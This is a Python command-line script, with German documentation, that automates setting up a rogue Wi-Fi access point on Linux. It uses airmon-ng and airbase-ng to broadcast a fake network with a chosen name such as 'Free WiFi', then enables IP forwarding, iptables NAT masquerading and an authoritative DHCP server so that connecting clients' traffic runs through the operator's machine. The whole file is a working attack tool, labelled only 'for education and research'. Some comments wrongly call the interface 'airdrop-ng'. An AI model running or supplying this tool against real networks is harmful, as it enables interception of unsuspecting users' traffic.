#!/usr/bin/env python3
"""
Modernisiertes Python 3 CLI-Tool zur Einrichtung eines Rogue Access Points (AP)
unter Linux, portiert von einem Bash-Skript.

Dieses Skript führt folgende Schritte durch:
- Abfrage von Netzwerkschnittstellen
- Aktivierung des Monitor-Modus auf der WLAN-Karte via airmon-ng
- Start eines Fake-APs mit airbase-ng
- Konfiguration der Schnittstelle at0 mit IP und Routing
- Aktivierung von IP-Forwarding
- Einrichtung von NAT mit iptables
- Start eines DHCP-Servers für den Rogue AP
- Anzeige von System-Logs in einem Terminalfenster

Copyright (c) 2025 Jan Schröder. Alle Rechte vorbehalten.
Teil des ByKnocKulasT Toolkits.

Voraussetzungen:
- Linux mit airmon-ng, airbase-ng, dhcpd3, iptables, xterm installiert
- WLAN-Karte, die Monitor-Modus unterstützt
- Ausführung mit root-Rechten empfohlen

Lizenz:
Nur für Bildungs- und Forschungszwecke. Nutzung auf eigenes Risiko.
"""

import os
import subprocess
import datetime
import sys

def run(cmd, capture_output=False):
    print(f"$ {' '.join(cmd)}")
    try:
        if capture_output:
            return subprocess.check_output(cmd, text=True).strip()
        else:
            subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Command failed: {' '.join(cmd)}\n{e}")
        sys.exit(1)

def main():
    print("PRE-REQUISITES")
    print("==============")
    print("- External interface configured and communicating.")
    print("- Wireless card connected but NOT configured.")
    print("- No interfaces on the 192.168.3.0/24 network.\n")

    logdir = datetime.datetime.now().strftime("%Y-%m-%d-%H%M")
    os.makedirs(logdir, exist_ok=True)
    os.chdir(logdir)

    # List interfaces
    print("Network Interfaces:")
    run(["ifconfig"], capture_output=False)
    
    iface = input("Enter the name of the interface connected to the internet, for example eth0: ").strip()

    # Show airmon-ng output
    run(["airmon-ng"])

    wiface = input("Enter your wireless interface name, for example wlan0: ").strip()
    essid = input("Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: ").strip()
    channel = input("Enter the channel you would like your rogue AP to communicate on [1-11]: ").strip()

    # Start monitor mode on wireless interface
    run(["airmon-ng", "start", wiface])

    # Run airbase-ng in background with output to airbase.log
    with open("airbase.log", "w") as f:
        proc = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-v", "mon0"], stdout=f, stderr=subprocess.STDOUT)

    # Tail airbase.log in a new terminal
    subprocess.Popen(["xterm", "-bg", "black", "-fg", "yellow", "-T", "Airbase-NG", "-e", "tail -f airbase.log"])

    print("Sleeping 5 seconds to let airbase-ng start...")
    subprocess.run(["sleep", "5"])

    print("Configuring interface created by airdrop-ng")
    run(["ifconfig", "at0", "192.168.3.1", "netmask", "255.255.255.0", "up"])
    # run(["ifconfig", "at0", "mtu", "1400"])  # Optional

    # Enable IP forwarding
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1\n")

    # Add route for 192.168.3.0/24 network
    run(["route", "add", "-net", "192.168.3.0", "netmask", "255.255.255.0", "gw", "192.168.3.1"])

    print("Setting up iptables to handle traffic seen by the airdrop-ng (at0) interface")
    # run(["iptables", "-P", "FORWARD", "ACCEPT"])  # optional
    run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

    print("Creating a dhcpd.conf to assign addresses to clients that connect to us")
    dhcpd_conf = """\
default-lease-time 600;
max-lease-time 720;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 192.168.3.0 netmask 255.255.255.0 {
    range 192.168.3.100 192.168.3.150;
    option routers 192.168.3.1;
    option domain-name-servers 8.8.8.8;
}
"""
    with open("dhcpd.conf", "w") as f:
        f.write(dhcpd_conf)

    print("DHCP server starting on our airdrop-ng interface (at0)")
    run(["dhcpd3", "-q", "-cf", "dhcpd.conf", "-pf", "/var/run/dhcp3-server/dhcpd.pid", "at0"])

    print("Launching DMESG")
    subprocess.Popen(["xterm", "-bg", "black", "-fg", "red", "-T", "System Logs", "-e", "tail -f /var/log/messages"])

    print("Done.")

if __name__ == "__main__":
    main()
